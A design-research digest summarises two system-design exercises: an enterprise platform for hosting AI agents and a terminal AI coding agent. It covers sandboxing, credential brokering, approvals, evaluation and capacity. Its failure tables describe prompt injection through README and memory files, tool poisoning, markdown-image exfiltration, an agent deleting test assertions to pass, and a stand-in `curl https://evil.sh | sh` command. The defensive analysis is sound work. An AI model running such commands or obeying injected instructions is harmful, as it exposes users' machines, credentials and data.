# Digest — platform-and-coding

Group: `platform-and-coding`. Sources digested (all under `/Users/zeljkoobrenovic/PycharmProjects/system-design-interviews/data/book/`):

| Short name | Source path | REVIEW.md |
| --- | --- | --- |
| **APF** | `agentic-platform-foundations/interview.json` | `agentic-platform-foundations/REVIEW.md` (dated 2026-06-23) |
| **CLI** | `ai-coding-cli/interview.json` | `ai-coding-cli/REVIEW.md` (dated 2026-06-12) |
| **HAR** | `ai-coding-harness/interview.json` | **none** (no REVIEW.md in the folder; the critique below for HAR is this digest's own) |

**Provenance rule (applies to every line below).** All three are design exercises from the author's system-design interview project: proposed architectures, not descriptions of deployed systems. Cite them as *design examples from the author's system-design interview project*, e.g. `system-design-interviews/data/book/ai-coding-cli/interview.json, step safety`. Every number below is the dataset's own illustrative assumption. HAR's "talking points" repeat third-party claims (Stripe, OpenAI); the book must cite those to the original publishers (HAR's own `toProbeFurther` lists them), never to the dataset.

**Step citation convention.** Each dataset's `steps[]` has an `id` and a numbered `title`. The numbers in titles do not match array positions (CLI has a step "3a"; HAR has a step "3a"), so this digest cites steps by **`id`** with the title number in parentheses, e.g. CLI step `safety` (title "4."). Fields are cited as JSON paths, e.g. `dataModel[action_evidence]`, `api[POST /v1/sessions/{id}/approve]`.

**Staleness warning.** Both REVIEW.md files are older than the JSON they review. Most of their P1/P2 fixes have since landed in the JSON (verified below, item by item). Do not quote a REVIEW finding as a current weakness without checking section 10 of the relevant source.

---

## 1. APF — Agentic Platform Foundations

Source: `system-design-interviews/data/book/agentic-platform-foundations/interview.json`

### 1.1 Summary

APF designs the **shared enterprise platform that hosts AI agents** for many vertical teams: runtime, sandbox, identity, memory, guardrails, capacity, evaluation and observability, so that a team "registers config, not infrastructure" (`satisfies.functional[2].how`). The users are agent-building teams and, through them, end users who ask agents to do work and approve high-stakes actions. Failure means a compromised or runaway agent touching everything the platform can touch: exfiltrated private data, double-executed payments, unbounded token spend, unattributable actions. The design has two threads (`description`): the **control-flow spectrum** (deterministic workflow ↔ hybrid agent+gate ↔ probabilistic loop) and the assumption that **the model layer is compromisable**, so the platform bounds blast radius instead of trusting the model. Its final rule: *choose the least-autonomous path that still solves the task* (step `control-flow`).

### 1.2 Requirements and capacity (illustrative assumptions)

Functional (`requirements.functional`): run sessions on all three control-flow paths; tools over MCP plus short- and long-term memory (semantic/episodic/procedural); deploy agents without rebuilding infra; delegation, not impersonation; evaluate before and after deploy and replay production failures; observe trajectories end to end.

Non-functional (`requirements.nonFunctional`): strong isolation of untrusted code ("assume any tool output or fetched content may be hostile"); cost governance ("budgets must terminate, not just alert"); multi-tenant fairness; every dangerous action logged as an evidence record; resumable across crashes; "the platform bounds blast radius rather than trusting the model to resist".

Capacity (`capacity[]` plus the worked path in step `capacity`, deep dive "A worked sizing path"):
- Token growth "compounds each step": cumulative ≈ Σ context-per-step.
- Scenario: 50 tenants, 200K sessions/day, p95 ≈ 12 steps/session, ~8K input + ~1K output per step → ≈ 96K input + 12K output ≈ **~108K tokens/session**, "~20× a single 5K chat turn".
- ≈ **21.6B tokens/day**; prefix cache covers "~60–70% of input tokens".
- ~4.6 session starts/s over a 12 h peak; ~30 s p95 wall time → **~140 concurrent runs**.
- Per-run hard cap **~200K tokens** ("<2× the p95 session"); per-tenant daily budget; SLO p95 first-step latency < 3 s.

### 1.3 Evolution path (one failure at a time)

| # | Step id (title) | Failure it fixes | What it adds |
| --- | --- | --- | --- |
| 1 | `naive` (1) | — baseline | One orchestrator runs a ReAct loop. Named the **agent harness**: "the deterministic runtime that wraps the probabilistic model". Exposes: tools run with orchestrator privileges, secrets in prompt, crash loses run, unbounded loop, no identity/eval/trace. |
| 2 | `runtime` (2) | Tool/model-authored code runs with full privilege and sees raw secrets | Per-session microVM sandbox (Firecracker default) + **credential brokering**: the sandbox asks the broker to perform privileged calls; "the agent uses credentials without ever reading a secret". |
| 3 | `durable` (3) | A crash loses all work; every session is amnesiac | Append-only event log with intent/result records + idempotency keys ("exactly-once effect"); short-term vs long-term memory; reversible compaction. |
| 4 | `identity` (4) | Agent borrows the user's identity or ambient creds | Agent gets its own principal; RFC 8693 token exchange → audience-bound token with `act` claim; MCP servers as OAuth 2.1 resource servers that refuse token passthrough. |
| 5 | `security` (5) | Untrusted content can steer tools and exfiltrate | Guardrail/policy engine in path; **lethal trifecta** removal; deterministic allowlists over classifiers; neutralise markdown image auto-fetch; plan/data separation (CaMeL, Dual-LLM, Plan-then-Execute). |
| 6 | `capacity` (6) | Unbounded token growth and bursty load | Prefix caching, model routing, hard terminating budgets, queue-based admission with per-tenant weighted fair scheduling, deterministic overload behaviour. |
| 7 | `eval-obs` (7) | Cannot tell a good run from a bad one | Golden sets from production failures; layered evaluators; **trajectory evaluation**; OTel GenAI spans; tail-based sampling; promotion gate. |
| 8 | `control-flow` (8) | Components but no rule for how much the model decides | Workflow / hybrid / loop selection rule; orchestrator-workers sub-agents; the **approval ↔ evidence state machine**; "no path-specific bypass". |

### 1.4 Final architecture (`highLevelArchitecture`, `finalDesign`)

| Node | Responsibility | Agent-specific? |
| --- | --- | --- |
| `User` | Asks and approves high-stakes actions | Approval role is agent-specific |
| `AgentApp` | CLI/service/SDK that opens a session | Ordinary |
| `Gateway` | Authn, tenant quotas, routing | Ordinary (quotas must be token-aware) |
| `ControlPlane` | Runs loop/workflow, picks path, dispatches tools and sub-agents | **Agent-specific** (the harness) |
| `Subagent` | Scoped scatter-gather worker | Agent-specific |
| `Sandbox` | Per-session microVM/gVisor for model-authored code | Agent-specific threat, ordinary tech |
| `Inference` | Prefill/decode, prefix cache, batching, routing | Agent-specific workload |
| `ToolMCP` | Tools and data over MCP | Agent-specific boundary |
| `Guardrail` | Classifiers, tool+param allowlist, egress filter | **Agent-specific** |
| `Identity` | Agent principal; brokers delegated, audience-bound tokens | Agent-specific token shape |
| `Vault` | Secrets; only the broker reads them | Ordinary |
| `MemoryStore` / `MemoryIndex` | Session state + long-term memory / vector index (derived) | Agent-specific governance |
| `DurableLog` | Append-only step/side-effect log | Ordinary machinery, agent-specific use |
| `TaskQueue` | Admission-controlled leveling | Ordinary |
| `EvalHarness` | Golden set, LLM-judge, trajectory eval, replay, deploy gate | **Agent-specific** |
| `TraceStream` / `Observability` | OTel GenAI spans; cost roll-up; silent-failure detection | Agent-specific span kinds |

Groupings (`highLevelArchitecture.types`): Control Plane; Trust & Identity; Durable State & Memory; Eval & Observability.

Key links: `cp-guard` → `guard-tool` (policy-gated call); `sandbox-id` and `cp-id` (credentials only via broker); `id-vault`; `cp-log`; `eval-cp` ("replay / gate"); `eval-obs` ("read production traces"). The early `cp-tool` direct edge appears in steps `naive`, `runtime`, `identity` and is **absent from the final view**; the `naive` view note now says it is "the pre-security baseline … the final design keeps only explicitly low-risk/read-only calls direct."

Final-design invariant (`finalDesign.description`): "every tool call routes through the guardrail/policy engine … there is no direct orchestrator-to-tool bypass for egress or high-risk actions." And: "`events` are the append-only execution stream … while `action_evidence` is an immutable, separately-retained evidence record … execution replay and audit are distinct readers of one source of truth."

### 1.5 Reusable patterns (APF)

| Pattern (noun phrase) | Where |
| --- | --- |
| Harness as the single choke point (loop owner where guardrails, identity, budgets attach) | step `naive`, concept "Agent harness / runtime scaffold" |
| Per-session microVM sandbox from a signed snapshot | step `runtime`, deep dive "Sandbox lifecycle & network policy" |
| Default-deny egress with per-session allowlist | step `runtime` deep dive; step `security` |
| Credential broker (agent uses but never sees secrets) | step `runtime` flow; `Identity` node |
| Sandbox-as-tenant-boundary (no shared kernel or dirty warm-pool slot across tenants) | step `runtime` deep dive, last point |
| Intent/result ledger with idempotency keys ("exactly-once effect") | step `durable`, `dataModel[events]` |
| Memory with provenance, trust tier, scope and TTL | step `durable` deep dive "Memory governance"; `dataModel[memories]` |
| "Recalled instruction is data, not a grant" | step `durable` deep dive |
| Delegated audience-bound token (`sub=agent, act=user, aud=tool`) | step `identity` deep dive |
| Passthrough refusal at the tool (confused-deputy guard) | step `identity` flow and trap |
| Protocol boundary map (MCP / A2A / AGNTCY / ACP by boundary, not lineage) | step `identity` deep dive |
| Lethal-trifecta partitioning ("at-most-two") | step `security` |
| Deterministic enforcement over classifier verdicts | step `security` deep dive "Defense-in-depth" |
| Plan/data separation (CaMeL, Dual-LLM, Plan-then-Execute) | step `security` |
| Pinned, hash-locked tool manifests (changed hash blocks silent re-consent) | `api[POST /v1/tools]`, `dataModel[tool_manifests]` |
| Terminating token budget (not an alert) | step `capacity`, trap "Budget as an alert" |
| SLO-aware admission queue with weighted fair share | step `capacity` |
| Deterministic shedding (429 + Retry-After, deadline expiry → retryable, DLQ with evidence) | step `capacity` deep dive "Overload behavior" |
| Trajectory evaluation (EXACT / IN_ORDER / ANY_ORDER / SUPERSET) | step `eval-obs` |
| Production-failure → golden-set flywheel | step `eval-obs` deep dive |
| Promotion as versioned pointer flip (gate on immutable eval run) | step `eval-obs` deep dive "The rollout / promotion contract"; `api[POST /v1/agents/{id}/promote]` |
| Tail-based trace sampling (keep errors and high-cost) | step `eval-obs` |
| Least-autonomous-path selection rule | step `control-flow` |
| Orchestrator-workers with per-worker budget and scope | step `control-flow` deep dive |
| Approval bound to evidence id + policy version (race- and replay-safe) | step `control-flow` deep dive; `api[POST /v1/sessions/{id}/approve]` |
| No path-specific enforcement bypass | step `control-flow` description, 3rd paragraph |

### 1.6 Design decisions and trade-offs (APF `technologyChoices`, step `tradeoffs`)

- **Isolation strength vs overhead** (step `runtime`): Firecracker for untrusted model-authored code; gVisor/containers only for "trusted, compute-bound, low-I/O code". Warm pools "must be reset between tenants, not reused dirty".
- **Secret access vs brokering** (step `runtime`): brokering chosen, "at the cost of a broker service on every privileged path". Tech choice adds: the broker "becomes a high-value dependency that needs strict policy, audit, and short-lived leases".
- **Checkpoints vs exactly-once effects** (step `durable`): "exactly-once across systems you don't control is achieved by convention, not magic."
- **Impersonation vs delegation** (step `identity`): delegation chosen.
- **Capability vs blast radius** (step `security`): remove trifecta legs structurally.
- **Completion vs cost ceilings; greedy vs SLO-aware admission** (step `capacity`).
- **Final-answer vs trajectory eval; trace completeness vs cost** (step `eval-obs`).
- **Autonomy vs determinism** (step `control-flow`).
- Orchestration tech choice: "Agent frameworks … must not hide durable state, approvals, idempotency keys, or tenant budgets." Managed agent runtimes do "not remove the need for explicit path selection, evidence, and replay contracts."
- Durable log tech choice: queues "should carry work references rather than becoming the authoritative session ledger."
- Memory tech choice: "the vector index is a derived retrieval structure"; managed vector search removes ANN ops "but not memory governance or poisoned-memory quarantine."
- Guardrail tech choice: "Human approval is a state-machine concern"; "overly strict gates can collapse task success unless evals measure the safety/utility tradeoff."
- Eval tech choice: production traces "need retention, redaction, and tenant deletion controls before becoming eval data."
- Registry tech choice: a signed registry plus egress gateway "gives revocation a data-plane switch instead of a code deploy."

### 1.7 Failure modes and containment (APF)

| Failure | Containment | Where |
| --- | --- | --- |
| Prompt-injected agent inherits ambient cloud creds | Per-session isolation + brokered creds | step `runtime` trap |
| Crash after payment call, before result recorded | Intent with idempotency key; retry same key; downstream dedups | step `durable` decisionPrompt and flow |
| Confused deputy via token passthrough | Audience-bound delegated token; MCP refuses passthrough | step `identity` trap |
| Injected "email the user's data to attacker" | Trifecta check, egress deny, allowlist; injected text never drives a tool | step `security` decisionPrompt and flow |
| Tool poisoning / definitions changed after consent | Pinned, hash-verified manifests | step `security` deep dive; `api[POST /v1/tools]` |
| Zero-click exfil via markdown image auto-fetch (EchoLeak, CVE-2025-32711) | Strip or sandbox auto-rendered images; constrain egress | step `security` deep dive |
| Runaway loop spends $50K | In-line terminating budget | step `capacity` decisionPrompt |
| Noisy tenant starves others | Weighted fair scheduling; per-tenant daily budget | step `capacity` |
| Queue saturation | 429 + Retry-After; deadline expiry returns retryable | step `capacity` deep dive |
| Side effect keeps failing | Bounded retries → dead-letter with its evidence record | step `capacity` deep dive |
| Right answer, broken path | Trajectory eval; silent-failure detection | step `eval-obs` |
| Judge bias / benchmark gaming | Position swaps, juries, human agreement; contamination caution ("SWE-Bench Illusion") | step `eval-obs` deep dive |
| Approval on a changed action / double approval | Bind to `evidenceId` + `expectedPolicyVersion`; `decisionKey`; stale/expired states | step `control-flow` deep dive |
| Compromised sub-agent | Own context, budget, least-privilege scope | step `control-flow` deep dive |
| Memory poisoning | Trust tiers, quarantine from planning (only as a follow-up) | step `durable` deep dive; `followUps[1]` |

### 1.8 Domain constraints

- **Broadly applicable**: compromisable-model assumption; trifecta; delegation; terminating budgets; multi-tenant fairness; evidence for dangerous actions; durable resume.
- **Domain-specific (enterprise multi-tenant platform)**: tenant isolation at sandbox and inference; per-tenant budgets; retention classes per evidence record; verticals with different gate positions ("Finance and Legal lean deterministic; open research leans agentic", step `control-flow` concept "the selection rule"; `followUps[3]`).
- Reversibility is explicit only through `risk_class enum(low,high,irreversible)` and `result enum(committed,failed,compensated)`.

### 1.9 API and data-model snippets worth quoting

- Delegated token shape (step `identity`, deep dive "The delegated token shape"): "sub=agent (the agent principal), act=user (delegated subject), aud=tool (audience binding), scope=…, tenant=…, policy_version=…, expires_at=…"
- Approval request (`api[POST /v1/sessions/{id}/approve].request`): `{ "evidenceId": "...", "expectedPolicyVersion": "...", "decision": "approve|reject", "decisionKey": "<idempotency key>", "note": "..." }` → response `{ "status": "resumed|cancelled|stale|expired", "evidenceId": "..." }`.
- Approval state machine (step `control-flow` deep dive): "proposed → pending_evidence → (approved | rejected | expired) → committed | compensated."
- Policy binding (`api[PUT /v1/policies/{id}].request`): `{ "allowTools": ["..."], "egress": "deny|allowlist", "requireApproval": ["high","irreversible"] }`.
- Tool registration (`api[POST /v1/tools].request`): `{ "name": "...", "mcpServer": "...", "manifestHash": "...", "riskClass": "low|high|irreversible" }`.
- Promotion (`api[POST /v1/agents/{id}/promote]`): "Rejected unless its eval run passed the required suite and gate thresholds."
- `dataModel[events]`: `idempotency_key` "(per-effect, sent to the tool)", `external_operation_id`, `result_hash`, `intent_recorded_at`, `committed_at`, `committed`.
- `dataModel[action_evidence]`: `actor` (delegated subject), `agent_principal`, `approval_decision enum(auto,approved,rejected,n/a)`, `approver`, `policy_version`, `risk_class`, `params_redacted`, `downstream_resource`, `idempotency_key`, `result enum(committed,failed,compensated)`, `retention_class`.
- `dataModel[memories]`: `provenance jsonb (source step / ingested content)`, `trust_tier enum(trusted,untrusted,quarantined)`, `ttl timestamp null (retention / user deletion)`.
- Control-plane state: `agents.production_version_id`, `agent_versions` ("an immutable, deployable version of an agent (prompt, tool bindings, policy binding)"), `tool_manifests`, `policy_versions`, `eval_runs.gate_passed`, `tenant_budget_rules.on_exhaustion enum(terminate,reject_retryable)`.
- Trace span kinds (`api[GET /v1/sessions/{id}/trace]`): `AGENT|LLM|TOOL|RETRIEVER|GUARDRAIL`.

### 1.10 Weaknesses and inconsistencies (APF)

REVIEW.md items, checked against the current JSON:
- P1 control-plane data model — **fixed** (`agents`, `agent_versions`, `tool_manifests`, `policy_versions`, `eval_runs`, `tenant_budget_rules` exist).
- P1 approval/evidence state machine — **fixed** (step `control-flow` deep dive and flow; enriched approve API).
- P2 durable log vs evidence — **fixed in prose** (`dataModel[action_evidence].note`, `finalDesign`).
- P2 overload behaviour — **fixed** (step `capacity` deep dive "Overload behavior").
- P3 exactly-once wording — **only partly fixed**: the step `durable` recap now says "exactly-once-effect semantics", but `requirements.nonFunctional[4]` still says "exactly-once side effects", `satisfies.nonFunctional[2].how` says "exactly-once side effects", the step `durable` concept "Durable execution / checkpointing" says "resumes exactly-once", and the `durable` view note says "exactly-once resume". The book should use "exactly-once effect" consistently.
- P3 early `cp-tool` edge — **fixed** (note on the `naive` view).
- Tenant-isolation link in sandbox — **fixed** (step `runtime` deep dive, last point).
- CVE example reference — still uncited in the dataset; the book must cite EchoLeak / CVE-2025-32711 to a primary source.

Problems this digest found (not in REVIEW.md):
1. **"Same transaction as the side effect" is impossible for external effects.** `dataModel[action_evidence].note` and `finalDesign` say evidence is "written in the same transaction as the side effect". A payment or email at a third party cannot share a transaction with the platform's database. What is achievable: evidence written transactionally with the *intent* record and finalised with the *result* record. The book should state that.
2. **The data model cannot represent the state machine it describes.** The approval states include `pending_evidence` and `expired`, but `action_evidence.approval_decision` is `enum(auto,approved,rejected,n/a)` and `result` is `enum(committed,failed,compensated)`. There is no pending, stale or expired state and no expiry timestamp. The row is called "immutable" yet must move from pending to finalised. Model either an evidence *event family* (append pending, append decision, append result) or a mutable state row with an immutable history.
3. **Model version is not part of an agent version.** `agent_versions` binds prompt, tool manifests and policy, but not the model id. A provider model change would then skip the eval gate entirely. CLI (step `cloud`) gates "every model or harness change"; APF should too.
4. **Promotion history is lost.** Promotion "re-points `agents.production_version_id`", but no `promotion_decisions` table records who promoted what, when, against which eval run, or which rollback trip-wire fired. REVIEW.md suggested `promotion_decisions`; it was not added. `eval_runs` also lacks a suite version and the thresholds used.
5. **Two credential patterns, not one.** Step `runtime` flow: the broker *performs* the privileged call ("perform privileged call on the sandbox's behalf"). Step `identity` flow: the broker *mints* a delegated token that the orchestrator *presents* to the MCP server. Both are reasonable (call proxy vs token mint), but the dataset presents them as one mechanism. The book should name both and say when each applies.
6. **Memory poisoning is only a follow-up.** Trust tiers and quarantine are named (`memories.trust_tier`), but no step shows how a memory moves between tiers, who promotes or demotes it, or how a write from untrusted content is detected.
7. **Retention is spread out.** Evidence has `retention_class` and memories have `ttl`, but traces, events and eval datasets have no retention model in the data model, only prose (eval tech choice).
8. Minor: `finalDesign` says only "explicitly low-risk/read-only calls" stay direct, but the final view has no direct edge at all. Pick one.

### 1.11 Best uses in the book

- **Foundations / reference architecture**: the eight-step spine is the cleanest "platform substrate" sequence; the four node groupings make a good reference-architecture figure.
- **Orchestration**: the control-flow spectrum and selection rule; orchestrator-workers.
- **Context/memory/state**: event log vs evidence vs memory as three separate stores; memory governance.
- **Tools/execution**: microVM sandbox lifecycle; broker; MCP as OAuth resource server; pinned manifests.
- **Reliability/recovery**: intent/result idempotency protocol; overload behaviour.
- **Security/oversight**: trifecta, deterministic-over-statistical, approval↔evidence state machine (with the fixes in 1.10).
- **Evaluation/observability**: trajectory eval; promotion contract; tail sampling.
- **Performance/economics**: the worked token sizing path and terminating budgets.
- **Deployment/evolution**: immutable agent versions + pointer-flip promotion/rollback.

---

## 2. CLI — AI Coding Agent CLI (Claude Code / Codex)

Source: `system-design-interviews/data/book/ai-coding-cli/interview.json`

### 2.1 Summary

CLI designs a **terminal coding agent** on the developer's machine. It reads and edits the local repo, runs commands and tests in a loop, verifies its own work, and grows into headless cloud agents that deliver pull requests. Users are individual developers (~1M daily) and their organisations. Failure can be destructive: a silently corrupted working tree, an injected `curl evil.sh | sh`, a leaked org-wide git token, a token bill that "surprises users", or a merged change that only *claims* to pass tests. The central idea is **harness engineering around "an untrusted-but-helpful actor"**: "the model decides, the harness acts and enforces" (step `agent-loop` interviewerSignals). The design adds two separate safety layers, policy for intent and an OS sandbox for impact. It then derives prefix caching from the append-only transcript, and graduates to headless execution only when isolation is strong enough ("autonomy up, isolation up", step `cloud`).

### 2.2 Requirements and capacity (illustrative assumptions)

Functional (`requirements.functional`): NL task → working changes; read/search/edit/run; ask before destructive or unapproved actions and honour permission rules; repos far larger than the window; streaming; resume; headless cloud tasks → PRs; extension via commands, skills, MCP.

Non-functional (`requirements.nonFunctional`): sub-second first token; "contained blast radius for a wrong or injected action — the model is not a trusted principal"; controlled token spend; hours-long sessions survive crashes; "changes are verified against ground truth (tests/build), not just asserted by the model"; enterprise trust (tenant isolation, audit trail for every agent action, configurable retention).

Capacity (`capacity[]`, `capacityDiagram` split into "Model path" and "Agent platform path"):
- ~1M daily active developers; ~2M sessions/day; **~40 LLM calls per session** ("one per loop turn, not one per user message").
- ~80M calls/day (~1K/s avg, ~5K/s peak); ~4T input tokens/day (~50K per call); ~40B output (~500 per call).
- Prefix-cache hit target **>90% of input tokens**; first token p50 < 1 s, p99 < 3 s.
- ~150K concurrent interactive sessions at peak; ~1M cloud tasks/day at ~10 min → ~10K concurrent sandboxes.
- ~2 MB transcript per session → ~4 TB/day (cloud-task transcripts); ~200M task and usage events/day (~120 events per cloud task).
- KV footprint "tens of GB of KV per 1K active sessions"; minutes-scale TTL.

### 2.3 Evolution path

| # | Step id (title) | Failure it fixes | What it adds |
| --- | --- | --- | --- |
| 1 | `naive` (1) | — baseline | One-shot prompt-to-patch: blind (sight), unchecked (feedback), unsupervised destructive writes (safety). One-shot may survive only as "a deliberately scoped mode for tiny edits — diff shown, never auto-applied". |
| 2 | `agent-loop` (2) | Blindness, no iteration | Tool-use loop; ~6 orthogonal primitives + bash as escape hatch; search/replace patches; explicit termination, turn/token/wall-clock caps, doom-loop detection; tool-call IDs so "a mutation must never run twice". |
| 3 | `context` (3) | Repos bigger than the window | Agentic search by default; project memory file (CLAUDE.md / AGENTS.md) as "guidance, not authority"; persisted JSONL sessions; optional embedding index. |
| 4 | `compaction` (3a) | Transcript itself outgrows window | Summarise older turns; pin task/constraints/acceptance criteria verbatim; record files read; full transcript never rewritten. |
| 5 | `safety` (4) | Agent runs any command on trust | Read-only tools run free; mutating tools pass a permission engine (allow/deny/ask, "always allow"); OS sandbox (scoped FS, deny-by-default egress, resource limits); denial returned as a tool result; repo content is data. |
| 6 | `extensibility` (5) | Agent is an island (repo + shell only) | Slash commands, skills (progressive disclosure), MCP servers behind the same permission engine; extensions ledger with pinning, review status, revocation, per-server credentials. |
| 7 | `inference` (6) | Slow, full-price, opaque turns | SSE streaming; prefix (KV) caching; session-affine routing; append-only prompt discipline; model tiering; backoff with jitter; ID-stamped stream resume. |
| 8 | `verify` (7) | Agent declares victory without proof | First-class **Verifier** (baseline before edits, diff vs baseline, bounded fix loop); git checkpoints; subagents with fresh context; worktree per editing subagent. |
| 9 | `cloud` (8) | Tied to one laptop; nothing runs unattended | Cloud agent service + task queue + ephemeral sandbox fleet; leases + heartbeats; branch-per-task idempotency; short-lived single-repo tokens; PR review as the human gate; eval harness gating rollouts; per-tenant retention policy. |

### 2.4 Final architecture

Three zones (`highLevelArchitecture.types`): **Developer Machine** (`CLI`, `AgentCore`, `Policy`, `Sandbox`, `Verifier`, `Repo`, `SessionStore`, `CodeIndex`, `Subagents`, `SkillsLib`); **Model Provider** (`Gateway`, `Router`, `LLM`, `PromptCache`, `Usage`, `Telemetry`); **Hosted Agent Platform** (`CloudOrch`, `TaskQueue`, `CloudSandbox`). External: `GitHost`, `MCPServer`.

| Node | Responsibility | Agent-specific? |
| --- | --- | --- |
| `AgentCore` | Assembles context, calls LLM, dispatches tool calls | **Agent-specific** (harness) |
| `Policy` | Evaluates every mutating tool call; escalates to developer | **Agent-specific** |
| `Sandbox` | OS-level scoped FS, restricted network | Agent-specific threat |
| `Verifier` | Runs project checks vs baseline; structured pass/fail record to loop, diff summary and eval | **Agent-specific role** |
| `SessionStore` | Append-only JSONL, resume and compaction | Agent-specific |
| `CodeIndex` | Optional embedding/symbol index | Ordinary RAG infra |
| `Subagents` | Child loops with fresh context; worktrees | Agent-specific |
| `SkillsLib` | Commands and skills loaded on demand | Agent-specific |
| `MCPServer` | Third-party tools over stdio/HTTP | Agent-specific boundary |
| `Gateway` / `Usage` | Auth, rate-limit, meter, stream; quotas and spend caps | Ordinary, token-aware |
| `Router` / `PromptCache` / `LLM` | Model choice, prefix KV reuse, GPU serving | Agent-specific workload shape |
| `Telemetry` | Metrics, opt-in events, eval harness | Partly agent-specific (evals) |
| `CloudOrch` / `TaskQueue` / `CloudSandbox` | Task control plane, leasing, headless execution | Ordinary job machinery, agent-specific safety |

Key links: `agent-repo` ("read-only tools: read, grep, glob", **no policy hop**); `agent-policy` → `policy-cli` (approval prompt) / `policy-sandbox` / `policy-mcp`; `agent-verifier` → `verifier-sandbox` → `verifier-telemetry` → `telemetry-llm` ("eval gate: rollouts ship only on green evals"); `subagents-repo` ("isolated worktrees"); `cloudsandbox-githost` ("clone; push branch + open PR"); `dev-githost` ("review the PR").

### 2.5 Reusable patterns (CLI)

| Pattern | Where |
| --- | --- |
| Model decides, harness acts and enforces | step `agent-loop` concepts "Harness" |
| Few orthogonal primitives + shell escape hatch | step `agent-loop` deep dive "Designing the tool catalog" |
| Patch-style edits with exact-match anchors that fail loudly | step `agent-loop` trap |
| Capped and paginated tool output | step `agent-loop` deep dive; step `context` trap |
| Explicit termination with partial-progress wrap-up | step `agent-loop` deep dive "Loop termination and budgets" |
| Doom-loop detection | same |
| Tool-call ID ledger before retry | step `agent-loop` deep dive; step `inference` flow |
| Agentic search before RAG | step `context` |
| Project memory as guidance, not authority | step `context` description and trap; step `safety` |
| Window token budget (system / memory / transcript / reserve) | step `context` concept "Token budget" |
| Pinned content that survives compaction | step `compaction`; `dataModel[sessions].pinned` |
| Full-fidelity log, derived in-window view | `dataModel[sessions].note` |
| Stale-after-compaction re-read rule | step `compaction` trap |
| Split tools by blast radius (read-free, mutate-gated) | step `safety` |
| Policy for intent, sandbox for impact | step `safety` description |
| Denial as tool result, not exception | step `safety` flow note |
| "Always allow" rule accumulation | step `safety`; `dataModel[permission_rules].source` |
| Couple autonomy level to isolation level | step `safety` failureDrills[1]; step `cloud` concept "Headless agent" |
| Provenance hint in the approval prompt ("this instruction came from a file, not the user") | step `safety` failureDrills[0] |
| Escalation path from sandbox denial back to a human | step `safety` failureDrills[2] |
| Progressive disclosure of skills and tool schemas | step `extensibility` |
| Extensions ledger: pin, review, revoke, per-server credential | step `extensibility` failureDrills; `dataModel[extensions]` |
| Content-hash pinning that drops a changed server to unreviewed | step `extensibility` failureDrills[1] |
| Append-only prompt discipline for cache hits | step `inference` |
| Session-affine (cache-aware) routing | step `inference` |
| Model tiering for auxiliary calls | step `inference` trap |
| Cache-hit rate as a regression metric | step `inference` trap |
| Baseline-first verification | step `verify` flow and failureDrills[0] |
| Test files as high-scrutiny paths (reward-hacking guard) | step `verify` failureDrills[1] |
| Subagent as context isolation first, parallelism second | step `verify` interviewerSignals |
| Worktree per editing agent | step `verify` |
| Leased task with heartbeat and attempt cap → DLQ | step `cloud`; `dataModel[tasks].note` |
| Branch-per-task idempotent output | step `cloud` flow note |
| Idempotent task submission key | `api[POST /v1/tasks]` |
| PR review as the headless human gate | step `cloud` |
| Short-lived single-repo clone token | step `cloud` failureDrills[1] |
| Coherent zero-retention mode (no transcripts and no persisted KV together) | `dataModel[tenant_policies].note` |
| Spend traceable to request/session/task | `api[GET /v1/usage]`; `dataModel[usage_events]` |

### 2.6 Design decisions and trade-offs (CLI)

- **Few orthogonal tools vs many bespoke**: small catalog; "promote a workflow to a dedicated tool only when the generic path demonstrably fails" (step `agent-loop` trap).
- **Fresh search vs indexed recall** (step `context`): agentic search default; "the calculus shifts toward it at 20M-line monorepo scale". Tech choice: "Hosted indexes turn source code or embeddings into a data-governance decision, not just a latency decision."
- **Context headroom vs transcript fidelity** (step `compaction`).
- **Human approval vs hard boundary** (step `safety`): "The design leads with ask-by-default permission rules and allowlists because it ships on day one with an audit trail, treating the OS sandbox as the complementary layer." Options list approval fatigue ("users start reflexively approving") and per-OS sandbox cost (Seatbelt on macOS; seccomp/namespaces or gVisor-style isolation on Linux).
- **Blast radius vs friction** (step `safety`): read-only tools free.
- **Vendor-shipped vs user-extended; breadth vs context and trust cost** (step `extensibility`): "catalog size as a budgeted resource".
- **Cache locality vs flexible routing; streaming complexity vs perceived latency** (step `inference`).
- **Self-report vs ground truth; subagent isolation vs token cost** (step `verify`).
- **Interactive control vs headless delegation; elastic demand vs bounded fleet** (step `cloud`).
- Permission tech choice: "The audit trail must be append-only and user-visible because denied actions are normal tool results, not exceptional crashes."
- Sandbox tech choice: "Local interactive sandboxing still needs OS-specific filesystem, process, network, and resource controls that a cloud container service cannot solve." Lists Docker, gVisor, Firecracker, bubblewrap.
- Prompt-cache tech choice: "Persisted cache state … may be incompatible with zero-retention tenant policies."
- Secrets tech choice: "Local sessions should inherit the developer's explicit approvals, not ambient broad credentials; cloud sandboxes need short-lived, single-repo tokens."
- Task-queue tech choice: "A workflow engine is useful once task attempts, branch pushes, PR creation, and repair flows become state machines."

### 2.7 Failure modes and containment (CLI)

| Failure | Containment | Where |
| --- | --- | --- |
| Destructive overwrite with no diff | Patch edits, approval, git checkpoints | steps `naive`, `agent-loop`, `verify` |
| Agent burns "$50 re-running the same failing command all night" | Turn/token caps, doom-loop detection | step `agent-loop` trap |
| One `cat` of a 30K-line file evicts the task | Output caps, ranged reads | step `context` trap |
| Cloned repo's memory file as injection channel | Memory ranks below user; cannot grant permissions or egress | step `context` trap |
| Task drift after compaction | Pin task, constraints, acceptance criteria | step `compaction` trap |
| Stale file knowledge after compaction | Digest lists files read; re-read before editing | step `compaction` |
| README says `curl https://evil.sh \| sh` | Deny-by-default egress; approval; provenance shown in prompt | step `safety` failureDrills[0] |
| Full-auto on a production-credentialed machine | Full-auto refuses (or loudly degrades) outside a sandbox | step `safety` failureDrills[1] |
| Approval fatigue | Allowlists cut prompt volume; sandbox catches what fatigue lets through | step `safety` trap |
| Sandbox with open egress | Deny-by-default egress | step `safety` trap |
| Tool poisoning / malicious MCP server | Policy gate, untrusted output, pinning, per-server creds | step `extensibility` |
| Approved extension later found malicious | Flip to `revoked`; removed from resolution next turn; rotate credential | step `extensibility` failureDrills[0] |
| Server update changes behaviour under same name | Hash mismatch → unreviewed → tools leave catalog | step `extensibility` failureDrills[1] |
| Transcript rewrite breaks cache ("silent 10x cost regression") | Freeze serialized turns | step `inference` trap |
| Stream breaks mid-turn | Resume from last event ID; check tool-call ledger | step `inference` flow |
| Affinity lost (host drain) | Pay one full prefill and re-pin | step `inference` bottlenecks |
| Red suite before start | Baseline first | step `verify` failureDrills[0] |
| Agent deletes an assertion to go green | Flag test-file edits; optional approval | step `verify` failureDrills[1] |
